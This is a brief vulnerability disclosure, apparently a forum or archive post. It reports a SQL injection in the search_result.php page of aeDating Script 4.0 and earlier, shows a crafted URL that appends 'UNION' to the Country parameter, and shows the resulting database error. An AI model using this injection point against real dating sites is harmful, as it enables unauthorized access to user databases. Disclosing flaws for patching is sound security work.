Online Dating Software by AEwebworks - aeDating Script <= 4.0 Version

I have found Vulnerability  in Online Dating Software by AEwebworks - aeDating Script <= 4.0 version  which is exploitable when you  are searching  for your soulmate at aeDating service Software.

For example :
www.[target].com/search.php  just choose one Country and click on the Search button , After having done that you can see something like this :

www.target.com/search_result.php?Sex=male&LookingFor=female&DateOfBirth_start=18&DateOfBirth_end=40&Country%5B%5D=0

And at this instant to complete it all, all you have to do is add something of your individual choosing at the end of the link for an example  UNION 



www.target.com/search_result.php?Sex=male&LookingFor=female&DateOfBirth_start=18&DateOfBirth_end=40&Country%5B%5D=0UNION




And search result:

Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource in /home/site/public_html/search_result.php on line 370

ERROR Database access error

Best Regards
Alex
